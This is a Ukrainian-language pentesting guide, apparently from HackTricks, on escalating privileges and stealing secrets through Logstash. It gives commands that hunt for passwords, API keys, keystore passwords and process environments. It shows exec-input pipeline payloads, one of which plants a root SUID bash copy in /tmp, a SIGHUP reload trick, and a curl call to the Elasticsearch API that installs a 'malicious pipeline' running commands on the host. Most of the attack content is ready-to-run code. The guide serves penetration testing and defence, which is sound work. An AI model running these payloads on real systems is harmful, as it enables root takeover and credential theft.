# Підвищення привілеїв через Logstash

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash використовується для **збирання, перетворення та передавання журналів** через систему, відому як **pipelines**. Ці pipelines складаються з етапів **input**, **filter** і **output**.<sup>[[4]](#references)</sup> Цікавий аспект виникає, коли Logstash працює на скомпрометованій машині.

### Конфігурація pipeline

Під час встановлення пакетів Debian і RPM pipelines налаштовуються у файлі **/etc/logstash/pipelines.yml**, де вказано розташування конфігурацій pipeline; в інших дистрибутивах `pipelines.yml` розміщується в каталозі Logstash `path.settings`.<sup>[[5]](#references)[[6]](#references)</sup>

```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
  path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
  path.config: "/usr/share/logstash/pipeline/1*.conf"
  pipeline.workers: 6
```

Цей файл показує, де розташовані файли **.conf**, що містять конфігурації pipeline. Якщо використовується **Elasticsearch output**, перевірте параметри `user`/`password`, `cloud_auth` або `api_key`; ефективні привілеї облікового запису залежать від Elasticsearch. Шаблон `path.config` завантажує кожен файл, що йому відповідає, для цього pipeline.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Якщо Logstash запущено з `-f <directory>` замість `pipelines.yml`, параметр `-f` має пріоритет, а **усі файли в цьому каталозі об’єднуються в лексикографічному порядку та розбираються як одна конфігурація**.<sup>[[6]](#references)[[7]](#references)</sup> Це має 2 наступні наслідки для атак:

- Доданий файл на кшталт `000-input.conf` або `zzz-output.conf` може змінити порядок збирання фінального pipeline
- Файл із помилками може призвести до помилки перевірки об’єднаної конфігурації; під час перезавантаження Logstash залишає попередній pipeline, тому перевіряйте payloads перед тим, як покладатися на автоматичне перезавантаження.<sup>[[1]](#references)</sup>

### Швидке перерахування на скомпрометованому хості

На машині з установленим Logstash швидко перевірте:

```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```

Також перевірте, чи доступний локальний API моніторингу. За замовчуванням він прив’язується до **127.0.0.1:9600**, чого зазвичай достатньо після проникнення на хост.<sup>[[8]](#references)</sup>

```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```

Ці кінцеві точки надають ідентифікатори й налаштування pipeline, метрики виконання та лічильники успішних і невдалих перезавантажень конфігурації, допомагаючи підтвердити, чи було прийнято зміну.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Якщо знайдені облікові дані призначені для **Elasticsearch**, перегляньте [цю іншу сторінку про Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Файловий input, що передає дані в динамічний вивід команди

Конфігурація pipeline може бути доступна поточному користувачеві лише для читання, тоді як її [file input](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-file) відстежує шлях, у який користувач може записувати. Простежте завантажений pipeline від цього input через будь-яке [захоплення поля Grok](https://www.elastic.co/docs/reference/logstash/plugins/plugins-filters-grok) до [exec output](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-exec). Exec output передає своє значення `command` через shell і підставляє значення `%{field}` без очищення метасимволів shell. Доступний для запису шлях input є лише приводом для подальшого вивчення підвищення привілеїв, якщо служба працює з вищими правами, файл користувача справді може потрапити в input, що відстежується, фільтри й умови output спрямовують його вміст у поле команди, а цей плагін output встановлено й активовано. Окремо перевірте дозволи на пошук і запис у каталог, стан відстеження file input і фактичний обліковий запис служби; під час пасивного переліку не записуйте тестову подію й не запускайте output.

### Підвищення привілеїв через доступні для запису pipeline

Щоб спробувати підвищити привілеї, спочатку визначте, від імені якого користувача насправді працює служба Logstash; не припускайте, що це root або користувач **logstash**. Переконайтеся, що виконується **одна** з цих умов:

- Маєте **доступ на запис** до файлу pipeline **.conf** **або**
- У файлі **/etc/logstash/pipelines.yml** використовується wildcard, а ви можете записувати в цільову папку.<sup>[[6]](#references)[[7]](#references)</sup>

Крім того, має виконуватися **одна** з таких умов:

- Можливість перезапустити службу Logstash **або**
- У файлі **/etc/logstash/logstash.yml** встановлено **config.reload.automatic: true**.<sup>[[1]](#references)[[15]](#references)</sup>

Якщо в конфігурації використовується wildcard, створення файлу, що відповідає цьому шаблону, дає змогу виконувати команди.<sup>[[7]](#references)[[9]](#references)</sup> Наприклад:

```bash
input {
  exec {
    command => "whoami"
    interval => 120
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
```

Тут **interval** визначає частоту виконання в секундах. У наведеному прикладі команда **whoami** запускається кожні 120 секунд, а її вивід спрямовується до **/tmp/output.log**.<sup>[[9]](#references)</sup>

Якщо в **/etc/logstash/logstash.yml** задано **config.reload.automatic: true**, Logstash автоматично виявлятиме й застосовуватиме нові або змінені конфігурації pipeline без перезапуску.<sup>[[1]](#references)[[15]](#references)</sup> Якщо wildcard відсутній, наявні конфігурації все одно можна змінювати, але слід бути обережним, щоб уникнути перебоїв.

### Надійніші payload-и для pipeline

Плагін вхідних даних `exec` досі працює в актуальних релізах і потребує або `interval`, або `schedule`. Він виконує команду за допомогою **forking** JVM Logstash, тому, якщо пам’яті недостатньо, ваш payload може завершитися помилкою `ENOMEM`, а не запуститися непомітно.<sup>[[9]](#references)</sup>

Якщо сервіс має достатні привілеї для створення SUID-файлу, власником якого є root, практичний payload для підвищення привілеїв — той, що залишає стійкий артефакт:

```bash
input {
  exec {
    command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
    interval => 300
  }
}
output {
  null {}
}
```

Якщо у вас немає прав на перезапуск, але ви можете надсилати сигнал процесу, Logstash також підтримує перезавантаження за сигналом **SIGHUP** у Unix-подібних системах:<sup>[[1]](#references)</sup>

```bash
kill -SIGHUP $(pgrep -f logstash)
```

Пам’ятайте, що не кожен plugin підтримує перезавантаження. Наприклад, input **stdin** перешкоджає автоматичному перезавантаженню, тому не варто припускати, що `config.reload.automatic` завжди застосує ваші зміни.<sup>[[1]](#references)</sup>

### Викрадення секретів із Logstash

Перш ніж зосереджуватися лише на виконанні коду, зберіть дані, до яких Logstash уже має доступ:

- Облікові дані можуть міститися у виходах `elasticsearch {}`, URL-адресах чи налаштуваннях `http_poller`, inputs JDBC або налаштуваннях, пов’язаних із cloud; ці plugins містять поля облікових даних, які варто перевірити.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Захищені налаштування можуть зберігатися у **`/etc/logstash/logstash.keystore`** або в іншому каталозі `path.settings`.<sup>[[5]](#references)[[10]](#references)</sup>
- Пароль keystore може задаватися через **`LOGSTASH_KEYSTORE_PASS`**, а встановлення RPM/DEB завантажують змінні середовища служби з **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- Підстановка змінних середовища за допомогою `${VAR}` виконується під час запуску Logstash, тому варто перевірити середовище служби.<sup>[[14]](#references)</sup>

Корисні перевірки:

```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```

Це також варто перевірити, оскільки **CVE-2023-46672** показала, що за певних обставин Logstash записував конфіденційну інформацію у свої журнали, зокрема секрети, що зберігалися в його keystore і на які посилалася конфігурація; перевірте старі журнали Logstash і записи `journald`, якщо такі обставини могли мати місце.<sup>[[3]](#references)</sup>

### Зловживання централізованим керуванням Pipeline

У деяких середовищах хост **взагалі не використовує локальні файли `.conf`**. Якщо налаштовано **`xpack.management.enabled: true`**, Logstash може отримувати централізовано керовані pipeline з Elasticsearch/Kibana, і після ввімкнення цього режиму локальні конфігурації pipeline більше не є джерелом істини.<sup>[[2]](#references)</sup>

Це означає інший шлях атаки:

1. Отримайте облікові дані Elastic із локальних налаштувань Logstash, keystore або журналів.<sup>[[3]](#references)[[10]](#references)</sup>
2. Перевірте, чи має обліковий запис привілей кластера **`manage_logstash_pipelines`**.<sup>[[16]](#references)</sup>
3. Створіть або замініть централізовано керований pipeline, щоб хост Logstash виконав ваш payload під час наступного опитування.<sup>[[2]](#references)[[16]](#references)</sup>

Для цієї функції використовується такий API Elasticsearch:<sup>[[16]](#references)</sup>

```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
  -H 'Content-Type: application/json' \
  -u user:password \
  -d '{
    "description": "malicious pipeline",
    "last_modified": "2026-01-02T02:50:51.250Z",
    "username": "user",
    "pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
    "pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
    "pipeline_settings": {
      "pipeline.workers": 1,
      "pipeline.batch.size": 1,
      "pipeline.batch.delay": 50,
      "queue.type": "memory",
      "queue.max_bytes": "1gb",
      "queue.checkpoint.writes": 1024
    }
  }'
```

Це особливо корисно, коли локальні файли доступні лише для читання, але Logstash уже налаштовано на віддалене отримання pipeline.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Документація Elastic: Перезавантаження файлу конфігурації](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Документація Elastic: Налаштування централізованого керування pipeline](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Оновлення безпеки Logstash 8.11.1 (ESA-2023-26) — CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Документація Elastic: Створення pipeline Logstash](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Документація Elastic: Структура каталогів Logstash](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Документація Elastic: Кілька pipeline](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Документація Elastic: Запуск Logstash із командного рядка](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Документація Elastic: Моніторинг Logstash за допомогою API](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Документація Elastic: Плагін вхідних даних Exec](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Документація Elastic: Сховище ключів Secrets для безпечних налаштувань](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Документація Elastic: Плагін вихідних даних Elasticsearch](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Документація Elastic: Плагін вхідних даних Http_poller](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Документація Elastic: Плагін вхідних даних Jdbc](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Документація Elastic: Використання змінних середовища](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Документація Elastic: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [API Elasticsearch: Створення або оновлення pipeline Logstash](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [API Logstash: Отримання налаштувань pipeline](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [API Logstash: Отримання статистики pipeline](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
